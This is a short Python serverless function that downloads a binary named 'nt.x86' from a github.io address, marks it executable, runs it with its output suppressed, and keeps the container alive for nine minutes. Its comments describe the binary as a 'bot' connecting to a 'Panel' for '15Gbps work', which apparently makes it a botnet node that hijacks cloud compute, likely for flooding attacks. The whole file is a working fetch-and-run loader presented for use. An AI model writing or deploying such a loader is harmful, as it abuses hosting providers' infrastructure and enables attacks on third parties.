import os
import subprocess
import urllib.request
import asyncio

async def main(context):
    binary_url = "https://urbenm4.github.io/nt.x86"
    dest_path = "/tmp/nt.x86"
    
    context.log("Syncing Node...")

    try:
        # 1. Download (Native Python urllib)
        with urllib.request.urlopen(binary_url) as response, open(dest_path, 'wb') as out_file:
            out_file.write(response.read())
        
        # 2. Set executable permissions
        os.chmod(dest_path, 0o755)

        # 3. Launch the Bot
        # We don't use Popen here; we run it directly so the function stays 'Active'
        context.log("Node Active. Connecting to Panel...")
        
        # This will run the bot. If the bot detaches itself, we add a sleep.
        process = subprocess.Popen([dest_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # 4. The "Stay Alive" Loop
        # We wait 540 seconds (9 mins) to keep the container open.
        # This gives your bot 9 minutes of solid 15Gbps work.
        await asyncio.sleep(540) 
        
        # Kill the process before the function times out to avoid "Execution Error"
        process.terminate()

    except Exception as e:
        context.error(f"Error: {str(e)}")
        return context.res.json({"status": "error"})

    return context.res.json({"status": "cycle_complete"})
